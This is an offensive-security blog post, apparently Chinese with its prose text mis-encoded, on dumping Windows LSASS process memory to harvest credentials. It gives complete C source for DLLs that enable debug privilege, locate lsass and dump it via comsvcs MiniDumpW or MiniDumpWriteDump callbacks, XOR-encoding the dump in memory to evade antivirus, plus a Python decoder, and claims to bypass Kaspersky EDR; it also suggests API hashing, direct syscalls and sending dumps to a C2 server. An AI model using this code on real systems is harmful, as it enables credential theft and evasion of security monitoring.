<figure data-type="image" tabindex="9"><img src="https://i.loli.net/2021/03/27/l57ZiWOAbNYfId8.png" alt="https://i.loli.net/2021/03/27/l57ZiWOAbNYfId8.png" loading="lazy"></figure>
<h2 id="0x01-å®ç°">0x01 å®ç°</h2>
<p>ä¸€äº›Dump Lsassæ–¹æ³•oræŠ€å·§çš„ç®€å•å®ç°ï¼Œä»¥åŠå®æˆ˜ä¸­çš„ä¸€äº›ä¼˜åŒ–</p>
<h3 id="1-ç¼–å†™dump-lsassçš„dll">1. ç¼–å†™Dump Lsassçš„DLL</h3>
<p>éœ€è¦ä»¥ä¸‹å‡ æ­¥æ“ä½œï¼š</p>
<ol>
<li>è·å–Debugæƒé™</li>
<li>æ‰¾åˆ°lsassçš„PID</li>
<li>ä½¿ç”¨MiniDumpæˆ–MiniDumpWriteDumpè¿›è¡Œå†…å­˜dump</li>
</ol>
<p>è¿™ä¸ªé€»è¾‘å¾ˆç®€å•ï¼Œå…¶ä¸­è·å–debugæƒé™å’Œè‡ªåŠ¨å¯»æ‰¾lsassçš„PIDç½‘ä¸Šä¹Ÿæœ‰ä¸å°‘çš„Demoï¼Œæ‰€ä»¥å¾ˆå¥½å®ç°</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;Windows.h&gt;
#include &lt;tlhelp32.h&gt;

typedef HRESULT(WINAPI* _MiniDumpW)(DWORD arg1, DWORD arg2, PWCHAR cmdline);

int GetLsassPid() {

	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (Process32First(hSnapshot, &amp;entry)) {
		while (Process32Next(hSnapshot, &amp;entry)) {
			if (wcscmp(entry.szExeFile, L&quot;lsass.exe&quot;) == 0) {
				return entry.th32ProcessID;
			}
		}
	}

	CloseHandle(hSnapshot);
	return 0;
}

void GetDebugPrivilege()
{
	BOOL fOk = FALSE;
	HANDLE hToken;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &amp;hToken))
	{
		TOKEN_PRIVILEGES tp;
		tp.PrivilegeCount = 1;
		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;tp.Privileges[0].Luid);
		tp.Privileges[0].Attributes = true ? SE_PRIVILEGE_ENABLED : 0;
		AdjustTokenPrivileges(hToken, FALSE, &amp;tp, sizeof(tp), NULL, NULL);
		fOk = (GetLastError() == ERROR_SUCCESS);
		CloseHandle(hToken);
	}
}

void DumpLsass()
{
	wchar_t  ws[100];
	_MiniDumpW MiniDumpW;
	
	MiniDumpW = (_MiniDumpW)GetProcAddress(LoadLibrary(L&quot;comsvcs.dll&quot;), &quot;MiniDumpW&quot;);
	swprintf(ws, 100, L&quot;%u %hs&quot;, GetLsassPid(), &quot;c:\\windows\\temp\\temp.bin full&quot;);

	GetDebugPrivilege();

	MiniDumpW(0, 0, ws);
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		DumpLsass();
		break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
</code></pre>
<p>æˆ‘ä»¬å…ˆæ‹¿rundll32æµ‹è¯•ä¸€ä¸‹ï¼ŒæˆåŠŸdumpäº†lsassè¿›ç¨‹ï¼š</p>
<figure data-type="image" tabindex="10"><img src="https://i.loli.net/2021/03/27/NiSnL7O3KIzXBa1.png" alt="https://i.loli.net/2021/03/27/NiSnL7O3KIzXBa1.png" loading="lazy"></figure>
<p>ç„¶åä½¿ç”¨åˆ©ç”¨RPCåŠ è½½SSPçš„æ–¹å¼æ¥è½¬å‚¨lsassçš„è¿›ç¨‹å†…å­˜ï¼š</p>
<figure data-type="image" tabindex="11"><img src="https://i.loli.net/2021/03/27/aNelHhgcySV5RJo.png" alt="https://i.loli.net/2021/03/27/aNelHhgcySV5RJo.png" loading="lazy"></figure>
<p>æˆåŠŸç»•è¿‡å¡å·´æ–¯åŸºå¯¹lsassçš„ç›‘æ§</p>
<h3 id="2-å°†dllä¸exeæ–‡ä»¶æ‰“åŒ…">2. å°†DLLä¸EXEæ–‡ä»¶æ‰“åŒ…</h3>
<p>æˆ‘ä»¬åœ¨ä½¿ç”¨è¯¥æ–¹æ³•æ—¶éœ€è¦ä¸Šä¼ exeå’Œdllï¼Œå¹¶ä¸”XPNåŸç‰ˆçš„ä»£ç éœ€è¦å°†SSP DLLçš„ç»å¯¹è·¯å¾„ä½œä¸ºå‚æ•°ä¼ å…¥ï¼Œåœ¨ä½¿ç”¨æ—¶éå¸¸ä¸æ–¹ä¾¿</p>
<p>å› æ­¤æˆ‘ä»¬å¯ä»¥å°†DLLæ”¾å…¥exeçš„èµ„æºèŠ‚åŒºï¼Œç„¶ååœ¨è¿è¡Œæ—¶é‡Šæ”¾åˆ°ç¨‹åºæ‰€åœ¨ç›®å½•ï¼ŒåŠ è½½å®Œæˆåå†åˆ é™¤DLL</p>
<p>æˆåŠŸdump lsassè¿›ç¨‹çš„å†…å­˜ï¼š</p>
<figure data-type="image" tabindex="12"><img src="https://i.loli.net/2021/03/27/cDC86MSWHNRqFZ2.png" alt="https://i.loli.net/2021/03/27/cDC86MSWHNRqFZ2.png" loading="lazy"></figure>
<p>å…³äºå°†æ–‡ä»¶æ·»åŠ åˆ°èµ„æºåŒºå¹¶é‡Šæ”¾å¯ä»¥å‚è€ƒï¼š<a href="https://blog.csdn.net/dengdao1372/article/details/101230640">C++å®ç°ç¬¬ä¸‰æ–¹èµ„æºé‡Šæ”¾ä¸è½½å…¥è¿‡ç¨‹ï¼ˆä»¥DLLä¸ºä¾‹ï¼‰</a></p>
<h3 id="3-å°†è¿›ç¨‹dumpåˆ°å†…å­˜">3. å°†è¿›ç¨‹dumpåˆ°å†…å­˜</h3>
<p>éƒ¨åˆ†AV/EDRä¼šç›‘æ§æˆ‘ä»¬dumpä¸‹æ¥çš„è¿›ç¨‹è½¬å‚¨æ–‡ä»¶ï¼Œå› æ­¤æˆ‘ä»¬æœ‰æ—¶éœ€è¦å°†è¿›ç¨‹dumpåˆ°ä¸€å—å†…å­˜ä¸­ï¼Œè¿›è¡ŒåŠ å¯†åå†å†™å…¥ç£ç›˜ï¼Œæˆ–è€…ç›´æ¥é€šè¿‡ç½‘ç»œè¿›è¡Œä¼ è¾“</p>
<p>ä¸»è¦åˆ©ç”¨çš„æ˜¯<code>MiniDumpWriteDump</code>çš„å›è°ƒå‡½æ•°æ¥å®ç°è¯¥æ“ä½œ</p>
<p>æˆ‘è¿™é‡Œå€Ÿé‰´äº†<code>@ired.team</code>çš„ä»£ç ï¼ˆ<a href="https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsass-passwords-without-mimikatz-minidumpwritedump-av-signature-bypass#minidumpwritedump-to-memory-using-minidump-callbacks">æ–‡ç« æˆ³è¿™é‡Œ</a>ï¼‰ï¼Œå¹¶åœ¨å†…å­˜ä¸­å¯¹è¿›ç¨‹è½¬å‚¨æ•°æ®è¿›è¡Œä¸<code>0x32</code>çš„æŒ‰ä½å¼‚æˆ–ï¼Œé€šè¿‡ç¼–è¯‘ä¸ºdllç„¶åä½¿ç”¨rundll32åŠ è½½</p>
<pre><code class="language-c">// dllmain.cpp : Defines the entry point for the DLL application.
#include &quot;pch.h&quot;
#include &lt;windows.h&gt;
#include &lt;DbgHelp.h&gt;
#include &lt;iostream&gt;
#include &lt;TlHelp32.h&gt;
#include &lt;processsnapshot.h&gt;
#pragma comment (lib, &quot;Dbghelp.lib&quot;)

LPVOID dumpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 75);
DWORD bytesRead = 0;

int GetLsassPid() {

	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (Process32First(hSnapshot, &amp;entry)) {
		while (Process32Next(hSnapshot, &amp;entry)) {
			if (wcscmp(entry.szExeFile, L&quot;lsass.exe&quot;) == 0) {
				return entry.th32ProcessID;
			}
		}
	}

	CloseHandle(hSnapshot);
	return 0;
}

void GetDebugPrivilege()
{
	BOOL fOk = FALSE;
	HANDLE hToken;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &amp;hToken))
	{
		TOKEN_PRIVILEGES tp;
		tp.PrivilegeCount = 1;
		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;tp.Privileges[0].Luid);
		tp.Privileges[0].Attributes = true ? SE_PRIVILEGE_ENABLED : 0;
		AdjustTokenPrivileges(hToken, FALSE, &amp;tp, sizeof(tp), NULL, NULL);
		fOk = (GetLastError() == ERROR_SUCCESS);
		CloseHandle(hToken);
	}
}

BOOL CALLBACK minidumpCallback(
	__in     PVOID callbackParam,
	__in     const PMINIDUMP_CALLBACK_INPUT callbackInput,
	__inout  PMINIDUMP_CALLBACK_OUTPUT callbackOutput
)
{
	LPVOID destination = 0, source = 0;
	DWORD bufferSize = 0;

	switch (callbackInput-&gt;CallbackType)
	{
	case IoStartCallback:
		callbackOutput-&gt;Status = S_FALSE;
		break;

		// Gets called for each lsass process memory read operation
	case IoWriteAllCallback:
		callbackOutput-&gt;Status = S_OK;

		// A chunk of minidump data that's been jus read from lsass. 
		// This is the data that would eventually end up in the .dmp file on the disk, but we now have access to it in memory, so we can do whatever we want with it.
		// We will simply save it to dumpBuffer.
		source = callbackInput-&gt;Io.Buffer;

		// Calculate location of where we want to store this part of the dump.
		// Destination is start of our dumpBuffer + the offset of the minidump data
		destination = (LPVOID)((DWORD_PTR)dumpBuffer + (DWORD_PTR)callbackInput-&gt;Io.Offset);

		// Size of the chunk of minidump that's just been read.
		bufferSize = callbackInput-&gt;Io.BufferBytes;
		bytesRead += bufferSize;

		RtlCopyMemory(destination, source, bufferSize);

		break;

	case IoFinishCallback:
		callbackOutput-&gt;Status = S_OK;
		break;

	default:
		return true;
	}
	return TRUE;
}

void DumpLsass()
{
	DWORD lsassPID = GetLsassPid();
	DWORD bytesWritten = 0;
	
	// Set up minidump callback
	MINIDUMP_CALLBACK_INFORMATION callbackInfo;
	ZeroMemory(&amp;callbackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION));
	callbackInfo.CallbackRoutine = &amp;minidumpCallback;
	callbackInfo.CallbackParam = NULL;

	GetDebugPrivilege();

	HANDLE lsassHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, lsassPID);
	// Dump lsass
	BOOL isDumped = MiniDumpWriteDump(lsassHandle, lsassPID, NULL, MiniDumpWithFullMemory, NULL, NULL, &amp;callbackInfo);

	for (DWORD i = 0; i &lt; bytesRead; i++)
	{
		*((BYTE*)dumpBuffer + i) ^= 0x32;
	}

	// At this point, we have the lsass dump in memory at location dumpBuffer - we can do whatever we want with that buffer, i.e encrypt &amp; exfiltrate
	HANDLE outFile = CreateFile(L&quot;c:\\temp\\temp.bin&quot;, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	// For testing purposes, let's write lsass dump to disk from our own dumpBuffer and check if mimikatz can work it
	WriteFile(outFile, dumpBuffer, bytesRead, &amp;bytesWritten, NULL);
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		DumpLsass();
		break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
</code></pre>
<p>æœ€ç»ˆå¾—åˆ°çš„temp.binå¦‚ä¸‹ï¼Œå·¦è¾¹æ˜¯ä½¿ç”¨procdumpå¾—åˆ°çš„æœªåŠ å¯†çš„è¿›ç¨‹è½¬å‚¨æ–‡ä»¶ï¼š</p>
<figure data-type="image" tabindex="13"><img src="https://i.loli.net/2021/03/27/5ZCMUO7PJfn2YEj.png" alt="https://i.loli.net/2021/03/27/5ZCMUO7PJfn2YEj.png" loading="lazy"></figure>
<p>æˆ‘ä»¬å¯ä»¥ç¼–å†™ä¸€ä¸ªpythonè„šæœ¬æ¥å°†æ–‡ä»¶è§£å¯†å›æ¥</p>
<pre><code class="language-c">with open(&quot;C:\\Temp\\temp.bin&quot;, &quot;rb&quot;) as f1:
    with open(&quot;C:\\Temp\\temp2.bin&quot;, &quot;ab&quot;) as f2:
        data = f1.read()
        print(len(data))
        for i in range(len(data)):
            newData = 0x32 ^ data[i]
            f2.write(bytes([newData]))
</code></pre>
<p>å¯ä»¥ä½¿ç”¨mimikatzæˆåŠŸè¯»å–ï¼š</p>
<figure data-type="image" tabindex="14"><img src="https://i.loli.net/2021/03/27/dxlhDWC9e8T1pfA.png" alt="https://i.loli.net/2021/03/27/dxlhDWC9e8T1pfA.png" loading="lazy"></figure>
<h3 id="4-x86ç¯å¢ƒä¸‹åˆ©ç”¨rpcåŠ è½½ssp">4. x86ç¯å¢ƒä¸‹åˆ©ç”¨RPCåŠ è½½SSP</h3>
<p><strong>TODO</strong></p>
<h3 id="5-å…¶å®ƒå¯èƒ½ç”¨åˆ°çš„ä¼˜åŒ–æ€è·¯">5. å…¶å®ƒå¯èƒ½ç”¨åˆ°çš„ä¼˜åŒ–æ€è·¯</h3>
<ol>
<li>Dumpè¿›ç¨‹çš„æ•æ„ŸAPIé€šè¿‡åŠ¨æ€è°ƒç”¨/API HashingæŠ€æœ¯æ¥è§„é¿é™æ€æ£€æµ‹</li>
<li>ç¼–å†™è‡ªå·±çš„dumpå‡½æ•°ï¼Œéƒ¨åˆ†æ•æ„ŸAPIä½¿ç”¨Direct Syscall</li>
<li>ä¸C2ç»“åˆï¼Œdumpçš„æ–‡ä»¶/è¯»å–çš„hashç›´æ¥å›ä¼ </li>
</ol>
<h2 id="0x02-å¯èƒ½é‡åˆ°çš„é—®é¢˜">0x02 å¯èƒ½é‡åˆ°çš„é—®é¢˜</h2>
<h3 id="1-ç¼ºå°‘vcè¿è¡Œåº“">1. ç¼ºå°‘VCè¿è¡Œåº“</h3>
<p>åœ¨æŸæ¬¡æˆæƒæ¸—é€æµ‹è¯•ä¸­ï¼Œå‡ºç°ç›®æ ‡æœºå™¨ç¼ºå¤±VCè¿è¡Œåº“çš„é—®é¢˜ï¼š</p>
<figure data-type="image" tabindex="15"><img src="https://i.loli.net/2021/03/27/1S7h2u8WyB3vrbJ.png" alt="https://i.loli.net/2021/03/27/1S7h2u8WyB3vrbJ.png" loading="lazy"></figure>
<p>è®¾ç½®é¡¹ç›®ä¸ºé™æ€é“¾æ¥ç¨‹åºæ‰€éœ€è¦çš„è¿è¡Œåº“å³å¯ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<figure data-type="image" tabindex="16"><img src="https://i.loli.net/2021/03/27/azJCfiHu5sU2yDF.png" alt="https://i.loli.net/2021/03/27/azJCfiHu5sU2yDF.png" loading="lazy"></figure>
<p>æˆåŠŸè¿è¡Œï¼Œç›®æ ‡ç¯å¢ƒä¸­å­˜åœ¨å¡å·´æ–¯åŸºEDRï¼Œæœ€ç»ˆæˆåŠŸdump lsass</p>
<figure data-type="image" tabindex="17"><img src="https://i.loli.net/2021/03/27/3he96KZ1BRUNAn2.png" alt="https://i.loli.net/2021/03/27/3he96KZ1BRUNAn2.png" loading="lazy"></figure>
<h3 id="2-dumpæ–‡ä»¶ä½“ç§¯è¿‡å¤§">2. dumpæ–‡ä»¶ä½“ç§¯è¿‡å¤§</h3>
<p>æœ‰æ—¶æˆ‘ä»¬å¯èƒ½ä¼šæ‰“åˆ°ä¸å‡ºç½‘çš„æœåŠ¡å™¨ï¼Œè€Œæ­¤æ—¶æˆ‘ä»¬åˆæ²¡æœ‰ç¨³å®šçš„ä»£ç†ï¼ˆRegeorgè¿™äº›é€Ÿåº¦å¤ªæ…¢ï¼‰ï¼Œä»…ä»…æœ‰ä¸€ä¸ªwebshellæ¥ä¸‹è½½å¤§äº30Mçš„æ–‡ä»¶æ˜¯ååˆ†ä¸ç¨³å®šçš„</p>
<p>ä¸ªäººä¸€èˆ¬çš„æ€è·¯å°±æ˜¯ï¼š</p>
<ul>
<li>å…æ€mimikatzæˆ–æå–sekurlsaæ¨¡å—ï¼Œå°†å·¥å…·ä¼ ä¸Šå»è¯»</li>
<li>ä¸Šä¼ 7z.exe&amp;&amp;7z.dllï¼Œå°†æ–‡ä»¶è¿›è¡Œåˆ†å·å‹ç¼©å†ä¸‹è½½</li>
</ul>
<p>ä¹Ÿæƒ³è¿‡ç›´æ¥æŠŠè¯»å–çš„åŠŸèƒ½å†™å…¥SSP DLLé‡Œï¼Œç„¶åç»“æœè¾“å‡ºåˆ°ç£ç›˜ï¼Œä½†è¿˜æœªè¿›è¡Œå°è¯•ï¼Œå…ˆç®—ä½œä¸€ç§æ€è·¯å§</p>
<h2 id="0x03-æ€»ç»“">0x03 æ€»ç»“</h2>
<ul>
<li>æ— æ€è½¯éšä¾¿ç©ï¼Œç›´æ¥mimikatzä¸Šå»è¯»å°±æ˜¯</li>
<li>æ— ç›‘æ§lsassçš„AV/EDRï¼Œå¯ä»¥é€šè¿‡å…æ€mimikatzè¿›è¡Œç›´æ¥è¯»å–ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ç™½åå•ç¨‹åºè¿›è¡Œdumpï¼ˆéœ€è¦æ³¨æ„éƒ¨åˆ†æ€è½¯ä¼šå¯¹ç™½åå•ç¨‹åºæŠ¥è­¦ï¼‰</li>
<li>å¦‚æœæ˜¯å¡å·´è¿™ç§ç›‘æ§lsassçš„ï¼Œæœ€å¥½æ˜¯ä½¿ç”¨åŠ è½½SSPçš„æ–¹å¼ï¼Œä¼˜ç¼ºç‚¹å‚è€ƒå‰é¢çš„ï¼Œå¯ä»¥æ ¹æ®ä¸åŒæƒ…å†µä½¿ç”¨ä¸åŒçš„æ–¹æ³•</li>
</ul>

        </div>

        
          <a class="animated fadeInUp p-2 items-center text-sm text-gray-700 border hover:bg-gray-300 leading-none rounded-full flex lg:inline-flex m-4 " href="https://redteamblog.icu/tag/-uEIOBB-D/">
            <span class="flex-auto">æ¸—é€æµ‹è¯•</span>
          </a>
        


        <div class="flex justify-between py-8">
          
            <div class="prev-post">
              <a href="https://redteamblog.icu/post/gongyingshangmanyou/">
                <h3 class="post-title">
                  <i class="ri-arrow-left-line"></i>
                  è®°ä¸€æ¬¡ä¾›åº”å•†åˆ°ç›®æ ‡ä¹‹æ—…
                </h3>
              </a>
            </div>
          

          
            <div class="next-post">
              <a href="https://redteamblog.icu/post/kerberos/">
                <h3 class="post-title">
                  Kerberosè®¤è¯åè®®å­¦ä¹ 
                  <i class="ri-arrow-right-line"></i>
                </h3>
              </a>
            </div>
          
        </div>

        

      </div>
    </div>

    <script src="https://redteamblog.icu/media/prism.js"></script>  
<script>

Prism.highlightAll()
let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");

// This should probably be throttled.
// Especially because it triggers during smooth scrolling.
// https://lodash.com/docs/4.17.10#throttle
// You could do like...
// window.addEventListener("scroll", () => {
//    _.throttle(doThatStuff, 100);
// });
// Only not doing it here to keep this Pen dependency-free.

window.addEventListener("scroll", event => {
  let fromTop = window.scrollY;

  mainNavLinks.forEach((link, index) => {
    let section = document.getElementById(decodeURI(link.hash).substring(1));
    let nextSection = null
    if (mainNavLinks[index + 1]) {
      nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
    }
    if (section.offsetTop <= fromTop) {
      if (nextSection) {
        if (nextSection.offsetTop > fromTop) {
          link.classList.add("current");
        } else {
          link.classList.remove("current");    
        }
      } else {
        link.classList.add("current");
      }
    } else {
      link.classList.remove("current");
    }
  });
});


document.addEventListener("DOMContentLoaded", function() {
  var lazyImages = [].slice.call(document.querySelectorAll(".post-feature-image.lazy"));

  if ("IntersectionObserver" in window) {
    let lazyImageObserver = new IntersectionObserver(function(entries, observer) {
      entries.forEach(function(entry) {
        if (entry.isIntersecting) {
          let lazyImage = entry.target
          lazyImage.style.backgroundImage = `url(${lazyImage.dataset.bg})`
          lazyImage.classList.remove("lazy")
          lazyImageObserver.unobserve(lazyImage)
        }
      });
    });

    lazyImages.forEach(function(lazyImage) {
      lazyImageObserver.observe(lazyImage)
    })
  } else {
    // Possibly fall back to a more compatible method here
  }
});

const menuContainer = document.querySelector('.menu-container')
const menus = document.querySelectorAll('.menu-container .menu')
const mask = document.querySelector('.mask')
const contentWrapper = document.querySelector('.content-wrapper')
const latestArticle = document.querySelector('.latest-article')
const readMore = document.querySelector('.read-more')
const indexPage = document.querySelector('.index-page')

const isHome = location.pathname === '/'
if (latestArticle) {
  latestArticle.style.display = isHome ? 'block' : 'none'
  readMore.style.display = isHome ? 'block' : 'none'
  indexPage.style.display = isHome ? 'none' : 'block'
}

const openMenu = () => {
  menuContainer.classList.add('open')
  menus.forEach(menu => {
    menu.classList.add('animated', 'fadeInLeft')
  })
  mask.classList.add('open')
  contentWrapper.classList.add('is-second')
}

const closeMenu = () => {
  menuContainer.classList.remove('open')
  menus.forEach(menu => {
    menu.classList.remove('animated', 'fadeInLeft')
  })
  mask.classList.remove('open')
  contentWrapper.classList.remove('is-second')
}
</script>
  
  </body>
</html>
